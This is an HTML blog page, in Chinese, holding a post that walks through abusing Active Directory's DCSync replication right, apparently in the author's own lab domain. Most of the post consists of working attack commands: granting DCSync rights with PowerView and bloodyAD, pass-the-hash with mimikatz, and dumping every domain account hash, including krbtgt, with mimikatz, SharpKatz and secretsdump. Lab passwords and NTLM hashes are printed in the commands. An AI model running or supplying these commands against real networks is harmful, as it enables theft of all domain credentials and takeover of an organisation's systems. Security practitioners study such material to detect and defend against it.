@@ -1,0 +1,236 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>caixiaoguan's Blog | caixiaoguan's Blog</title><meta name="author" content="caixiaoguan"><meta name="copyright" content="caixiaoguan"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="title: my blog 利用原理在域中，不同的DC之间，每隔15分钟会进行一次域数据的同步。当一个DC（辅助DC）想从其他DC（主DC）获取数据时，辅助DC会向主DC发起一个GetNCChanges请求。请求的数据包括需要同步的数据。如果需要同步的数据比较多，则会重复上述过程。DCSync就是利用的这个原理，通过Directory Replication Service(DRS)服务的Get">
+<meta property="og:type" content="article">
+<meta property="og:title" content="caixiaoguan&#39;s Blog">
+<meta property="og:url" content="http://example.com/2024/08/10/dcsync%E5%88%A9%E7%94%A8/index.html">
+<meta property="og:site_name" content="caixiaoguan&#39;s Blog">
+<meta property="og:description" content="title: my blog 利用原理在域中，不同的DC之间，每隔15分钟会进行一次域数据的同步。当一个DC（辅助DC）想从其他DC（主DC）获取数据时，辅助DC会向主DC发起一个GetNCChanges请求。请求的数据包括需要同步的数据。如果需要同步的数据比较多，则会重复上述过程。DCSync就是利用的这个原理，通过Directory Replication Service(DRS)服务的Get">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/my.jpg">
+<meta property="article:published_time" content="2024-08-09T20:49:49.366Z">
+<meta property="article:modified_time" content="2024-08-09T20:50:44.406Z">
+<meta property="article:author" content="caixiaoguan">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/my.jpg"><link rel="shortcut icon" href="/img/my.jpg"><link rel="canonical" href="http://example.com/2024/08/10/dcsync%E5%88%A9%E7%94%A8/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'caixiaoguan\'s Blog',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-08-10 04:50:44'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/my.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">2</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr class="custom-hr"/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="caixiaoguan's Blog"><span class="site-name">caixiaoguan's Blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">无题</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-08-09T20:49:49.366Z" title="发表于 2024-08-10 04:49:49">2024-08-10</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-08-09T20:50:44.406Z" title="更新于 2024-08-10 04:50:44">2024-08-10</time></span></div><div class="meta-secondline"></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>title: my blog</p>
+<h1 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h1><p>在域中，不同的DC之间，每隔15分钟会进行一次域数据的同步。当一个DC（辅助DC）想从其他DC（主DC）获取数据时，辅助DC会向主DC发起一个GetNCChanges请求。请求的数据包括需要同步的数据。如果需要同步的数据比较多，则会重复上述过程。DCSync就是利用的这个原理，通过Directory Replication Service(DRS)服务的GetNCChanges接口向域控发起数据同步请求。</p>
+<h1 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h1><p>获得以下任一用户的权限：</p>
+<ul>
+<li>Domain Admins组内的用户</li>
+<li>Administrators组内的用户</li>
+<li>Enterprise Admins组内的用户</li>
+<li>域控制器的计算机帐户</li>
+</ul>
+<p>默认只有域控主机账号和域管理员能进行Dcsync，其机器账号拥有WriteACL的权限，可以给指定用户添加Dcsync来dump域哈希。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">复制目录更改（DS-Replication-Get-Changes）</span><br><span class="line"></span><br><span class="line">全部复制目录更改 (DS-Replication-Get-Changes-All )</span><br></pre></td></tr></table></figure>
+
+<h1 id="查寻存在DCSync权限的账户"><a href="#查寻存在DCSync权限的账户" class="headerlink" title="查寻存在DCSync权限的账户"></a>查寻存在DCSync权限的账户</h1><h2 id="域控查看"><a href="#域控查看" class="headerlink" title="域控查看"></a>域控查看</h2><p>上帝视角先了解一下这几个权限的位置，打开AD管理中心，又键域名，属性</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1688542032410-c6edd7c5-a710-4840-b97c-d0e1c9d030ac.png"></p>
+<h2 id="adfind"><a href="#adfind" class="headerlink" title="adfind"></a>adfind</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -s subtree -b &quot;DC=guan,DC=com&quot; -sdna nTSecurityDescriptor -sddl+++ -sddlfilter ;;;&quot;Replicating Directory Changes&quot;;; -recmute</span><br><span class="line"></span><br><span class="line">AdFind.exe -s subtree -b &quot;DC=guan,DC=com&quot; -sdna nTSecurityDescriptor -sddl+++ -sddlfilter ;;;&quot;Replicating Directory Changes All&quot;;; -recmute</span><br></pre></td></tr></table></figure>
+
+<p> <img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1688539957867-9defb97a-e336-41fa-a350-c86a673570cc.png"></p>
+<h1 id="给特定用户赋予DCSync权限"><a href="#给特定用户赋予DCSync权限" class="headerlink" title="给特定用户赋予DCSync权限"></a>给特定用户赋予DCSync权限</h1><h2 id="powerview-ps1"><a href="#powerview-ps1" class="headerlink" title="powerview.ps1"></a>powerview.ps1</h2><p>使用hash传递跳出的新cmd弹窗，或在我们控制的域机器上登录拥有赋予dcsync权限（域管，或域管机器用户）用户，执行以下命令达到远程赋予dcsync的功能</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">更改默认策略，使得脚本可以执行：</span><br><span class="line">Set-ExecutionPolicy Bypass -Scope Process</span><br><span class="line">或</span><br><span class="line">Powershell -ExecutionPolicy Bypass</span><br><span class="line"></span><br><span class="line">导入脚本：</span><br><span class="line">import-module .\PowerView.ps1</span><br><span class="line"></span><br><span class="line">将指定用户写入DCSync：</span><br><span class="line">Add-DomainObjectAcl -TargetIdentity &quot;DC=guan,DC=com&quot; -PrincipalIdentity guan1 -Rights DCSync -Verbose</span><br><span class="line">cmd下写入：</span><br><span class="line">powershell.exe -exec bypass -command &quot;&amp;&#123;Import-Module .\PowerView.ps1;Add-DomainObjectAcl -TargetIdentity \&quot;DC=test,DC=com\&quot; -PrincipalIdentity haha -Rights DCSync -Verbose&#125;&quot;</span><br><span class="line"></span><br><span class="line">删除指定用户的DCSync:</span><br><span class="line">Remove-DomainObjectAcl -TargetIdentity &quot;DC=guan,DC=com&quot; -PrincipalIdentity guan1 -Rights DCSync -Verbose</span><br><span class="line">cmd下删除：</span><br><span class="line">powershell.exe -exec bypass -command &quot;&amp;&#123;Import-Module .\PowerView.ps1;Remove-DomainObjectAcl -TargetIdentity \&quot;DC=test,DC=com\&quot; -PrincipalIdentity test -Rights DCSync -Verbose&#125;&quot;</span><br><span class="line"></span><br><span class="line">查询具有DCSync权限的用户：</span><br><span class="line">Find-InterestingDomainAcl -ResolveGUIDs | ?&#123;$_.ObjectAceType  -match &quot;DS-Replication-Get-Changes&quot;&#125;</span><br><span class="line">Find-InterestingDomainAcl -ResolveGUIDs | ?&#123;$_.ObjectAceType  -match &quot;Replicating Directory Changes&quot;&#125; </span><br><span class="line">Find-InterestingDomainAcl -ResolveGUIDs | ?&#123;$_.ObjectAceType  -match &quot;DS-Replication-Get-Changes-All&quot;&#125;</span><br><span class="line"></span><br><span class="line">查询用户的ACL:</span><br><span class="line">Get-DomainObjectAcl -Identity guan1 -domain guan.com -ResolveGUIDs</span><br></pre></td></tr></table></figure>
+
+<p>赋予过程：</p>
+<p>用域管远程登录控制的域机器：</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1688982125103-46943000-65de-45ab-a253-4e982f151eec.png"></p>
+<p>为域用户guan1赋予dcsync权限</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1688982179615-ce32079e-4f8c-4b06-b91b-8b523a775e8e.png"></p>
+<p>查询结果：</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1688982333198-11733d5d-99c4-45a6-92d1-22bec309254e.png"></p>
+<p>查看用户guan1的访问控制列表</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1688982453962-9d6a906c-0164-44c4-b5d9-35648f762d5e.png"></p>
+<h2 id="bloodyAD-py"><a href="#bloodyAD-py" class="headerlink" title="bloodyAD.py"></a>bloodyAD.py</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">查看帮助文档</span><br><span class="line">python3 bloodyAD.py -h</span><br><span class="line">python3 bloodyAD.py add -h</span><br><span class="line">python3 bloodyAD.py add dcsync -h</span><br><span class="line"></span><br><span class="line">知道账户密码：</span><br><span class="line">proxychains3 python3 bloodyAD.py -d hack-guan.com -u exchange$ -p Hack@12 --host 10.10.10.10 add dcsync hackweb</span><br><span class="line"></span><br><span class="line">知道账户hash:</span><br><span class="line">proxychains3 python3 bloodyAD.py -d hack-guan.com -u exchange$ -p :690f662f7f12700eae9e1c65dcd648be --host 10.10.10.10 add dcsync hackweb</span><br><span class="line"></span><br><span class="line">删除dcsync：将add改为remove即可</span><br><span class="line"></span><br><span class="line">Commands:</span><br><span class="line">  &#123;add,get,remove,set&#125;</span><br><span class="line">    add                 [ADD] function category</span><br><span class="line">    get                 [GET] function category</span><br><span class="line">    remove              [REMOVE] function category</span><br><span class="line">    set                 [SET] function category</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1689315265810-cc5ccfa2-1828-4c4d-bb40-67fa091b73e1.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1689315246685-3214540d-ae6b-4131-90b1-2dafa5bf0397.png"></p>
+<p><strong>验证</strong></p>
+<p><strong>1）建立代理</strong></p>
+<p><strong>2）hash传递目标域用户</strong></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1689321628111-60367138-569b-4d05-9c6f-f016462df7e5.png"></p>
+<p>3）SharpKatz.exe利用目标账户的dcsync功能导出域所有hash（mimikatz不能远程导出，无法指定域）</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1689321710504-826ade1b-995b-42c7-8216-782563908a73.png"></p>
+<p>4）成功</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1689321862196-7a7fadea-000b-4c01-8d79-c1e902af8cd2.png"></p>
+<h1 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h1><h2 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h2><p>（环境：通过socks5代理使得外域机可以访问域内主机，通过远程桌面访问我们控制的域机器来操作）</p>
+<p>前提，已经通过上述步骤为所控制的域用户赋予DCSync权限</p>
+<p>将mimitakz上传到我们完全控制的域机器，远程登录（该域用户也是本地管理员）</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1688997617863-67a87615-a827-4d4b-a8cc-b5cae6863ed3.png"></p>
+<p>直接用以下命令导出域hash</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;log Micropoor.txt&quot;  &quot;lsadump::dcsync /domain:guan.com /all /csv&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>
+
+<h2 id="dc-hash传递"><a href="#dc-hash传递" class="headerlink" title="dc$ hash传递"></a>dc$ hash传递</h2><p>(环境：通过socks5代理使得外域机可以访问域内主机，通过远程桌面访问我们控制的域机器来操作)</p>
+<p>验证证初始环境</p>
+<p>mimikatz使用dcsync功能导出hash</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;log Micropoor.txt&quot;  &quot;lsadump::dcsync /domain:guan.com /all /csv&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>
+
+<p>失败报错，当前域用户没有dcsync权限</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1688562663286-8e21ee82-045a-423a-9c7d-eb9e411108e4.png"></p>
+<p>先拿到DC$ 的hash</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1688562356812-cfbac079-0c06-4037-bdac-eaa40d088ff3.png"></p>
+<p>利用mimikatz 进行hash传递获得注入dc$后的命令窗口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::pth /user:dc$ /domain:guan.com /ntlm:963acb058f2fd451a689d86b51739fe1&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1688562822915-0b5d5e8e-5a38-4e8d-af81-70324577f00a.png"></p>
+<p>再次实践，mimikatz使用dcsync功能导出hash</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1688998111140-4d2eab5e-450c-4e48-a2df-b33bae8f875a.png"></p>
+<p>尝试在此窗口下加载powerview脚本将dcsync 权限赋给guan1</p>
+<p>失败，可能dc$没有这个权限</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1688998216159-09346049-e7bc-440e-b19e-c9be96295d2e.png"></p>
+<p>尝试用域管的hash进行hash传递，验证是否真的是dc$账户没有赋予dcsync的权限，还是说是远程登录相关限制的问题</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::pth /user:administrator /domain:guan.com /ntlm:3642639123c37049ac21e1d12b39eb17&quot;</span><br></pre></td></tr></table></figure>
+
+<p>域管的hash传递可以成功赋予</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1688998621580-69b4cb09-0128-4819-ba14-fd0c15f5967c.png"></p>
+<p>确认是dc$只是有dcsync这个功能，但并没有赋予其它域用户这个功能的权限</p>
+<h2 id="Sharpkatz"><a href="#Sharpkatz" class="headerlink" title="Sharpkatz"></a>Sharpkatz</h2><p>（先通过socks代理使得外域机能联系域内主机，使用proxifier）</p>
+<p>以用域管账户密码导出krbtgt为例（域管默认有dcsync这个权限）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SharpKatz.exe --Command dcsync --User krbtgt --Domain guan.com --DomainController 10.10.10.60 --AuthUser administrator --AuthDomain Guan.com --AuthPassword Guan207566903</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sharekatz.exe -h 查看帮助文档</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1689002057974-be26b00f-ceab-47e1-94ed-80c516707b2d.png"></p>
+<h2 id="secretsdump"><a href="#secretsdump" class="headerlink" title="secretsdump"></a>secretsdump</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">知道账户密码</span><br><span class="line">proxychains3 python3 secretsdump.py GUAN/administrator:Guan207566903@10.10.10.60</span><br><span class="line"></span><br><span class="line">知道账户hash</span><br><span class="line">proxychains3 python3 secretsdump.py -hashes :3642639123c37049ac21e1d12b39eb17 GUAN/administrator@10.10.10.60</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1689002527669-343a90be-07af-470a-976e-c593af58b4e9.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/38418516/1689002757841-43d5f596-ebad-4984-aaa2-f417ec20ffa9.png"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">caixiaoguan</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2024/08/10/dcsync%E5%88%A9%E7%94%A8/">http://example.com/2024/08/10/dcsync利用/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">caixiaoguan's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/img/my.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2024/08/10/hello-world/" title="Hello World"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Hello World</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/my.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">caixiaoguan</div><div class="author-info__description">弱者可以生来被看不起，但不能屈身投降</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">2</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86"><span class="toc-number">1.</span> <span class="toc-text">利用原理</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-number">2.</span> <span class="toc-text">利用条件</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9F%A5%E5%AF%BB%E5%AD%98%E5%9C%A8DCSync%E6%9D%83%E9%99%90%E7%9A%84%E8%B4%A6%E6%88%B7"><span class="toc-number">3.</span> <span class="toc-text">查寻存在DCSync权限的账户</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%9F%E6%8E%A7%E6%9F%A5%E7%9C%8B"><span class="toc-number">3.1.</span> <span class="toc-text">域控查看</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#adfind"><span class="toc-number">3.2.</span> <span class="toc-text">adfind</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BB%99%E7%89%B9%E5%AE%9A%E7%94%A8%E6%88%B7%E8%B5%8B%E4%BA%88DCSync%E6%9D%83%E9%99%90"><span class="toc-number">4.</span> <span class="toc-text">给特定用户赋予DCSync权限</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#powerview-ps1"><span class="toc-number">4.1.</span> <span class="toc-text">powerview.ps1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bloodyAD-py"><span class="toc-number">4.2.</span> <span class="toc-text">bloodyAD.py</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B"><span class="toc-number">5.</span> <span class="toc-text">利用过程</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#mimikatz"><span class="toc-number">5.1.</span> <span class="toc-text">mimikatz</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#dc-hash%E4%BC%A0%E9%80%92"><span class="toc-number">5.2.</span> <span class="toc-text">dc$ hash传递</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Sharpkatz"><span class="toc-number">5.3.</span> <span class="toc-text">Sharpkatz</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#secretsdump"><span class="toc-number">5.4.</span> <span class="toc-text">secretsdump</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/10/dcsync%E5%88%A9%E7%94%A8/" title="无题">无题</a><time datetime="2024-08-09T20:49:49.366Z" title="发表于 2024-08-10 04:49:49">2024-08-10</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/10/hello-world/" title="Hello World">Hello World</a><time datetime="2024-08-09T18:14:18.947Z" title="发表于 2024-08-10 02:14:18">2024-08-10</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By caixiaoguan</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div></body></html>
